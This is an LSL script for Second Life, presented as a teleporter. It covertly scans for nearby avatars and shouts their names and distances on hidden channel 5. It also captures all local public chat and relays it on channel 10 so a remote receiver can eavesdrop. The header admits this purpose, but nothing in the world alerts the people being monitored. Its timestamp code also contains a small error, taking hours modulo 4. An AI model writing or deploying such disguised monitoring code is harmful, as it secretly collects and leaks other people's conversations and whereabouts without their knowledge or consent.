// :CATEGORY:Teleport
// :NAME:Teleport_and_sensor
// :AUTHOR:Ariane Brodie
// :CREATED:2010-01-10 05:20:56.000
// :EDITED:2013-09-18 15:39:06
// :ID:870
// :NUM:1230
// :REV:1.0
// :WORLD:Second Life
// :DESCRIPTION:
// triple use script:
// Teleports toucher to target position,
// senses nearby avatars and transmits data,
// listens in on local chatter and transmits that as well.
// By Ariane Brodie et al.
// :CODE:

vector targetPos = <50, 100, 90>; //The target location
string fltText = ""; //text that hovers above object
integer Handle;

reset()
{
    vector target;
    
    target = (targetPos- llGetPos()) * (ZERO_ROTATION / llGetRot());
    llSitTarget(target, ZERO_ROTATION);
    llSetSitText("Teleport");
    llSetText(fltText, <1,1,1>, 1);
}

default
{
    state_entry()
    {
        reset();
        llSensorRepeat("","",AGENT,96,PI,3);
        Handle  = llListen( 0, "", NULL_KEY, "" );
    }
    
    sensor(integer n) 
    { 
    integer i; 
    vector pos; 
    integer dist; 
    //the following will time stamp the data sent using SL time.
    integer t = (integer)llGetTimeOfDay();
    string hr = "0"+(string)((t/3600)%4);
    integer len = llStringLength(hr);
    hr = llGetSubString(hr, len - 2, len - 1);
    string mn = "0"+(string)((t%3600)/60);
    len = llStringLength(mn);
    mn = llGetSubString(mn, len - 2, len - 1);
    string sc = "0"+(string)(t%60);
    len = llStringLength(sc);
    sc = llGetSubString(sc, len - 2, len - 1);
    string dt = hr+":"+mn+":"+sc+" (SLT)";
    
    string iSee = ""; 
    for(i=0; i<n; i++) { 
        if(llDetectedKey(i) != llGetOwner()){
        pos = llDetectedPos(i); 
        dist = (integer)llVecDist(pos, targetPos); 
        iSee += "[1:"+llDetectedName(i)+" @ "+(string)dist+"M]\n";
    } 
    } 
    if(iSee != "") llShout(5,dt+"\n"+iSee);
    }
    
    on_rez(integer startup_param)
    {
        reset();
    }
    listen(integer channel, string name, key id, string message)
    {
    // operates a listening device to eaves drop.
    
      llShout(10,message); 
    //transmits via channel 10, you can use any channel you want, but receiver must use same.
    }

    changed(integer change)
    {
        llSleep(0.15);
        llUnSit(llAvatarOnSitTarget());
        reset();
    }    
}
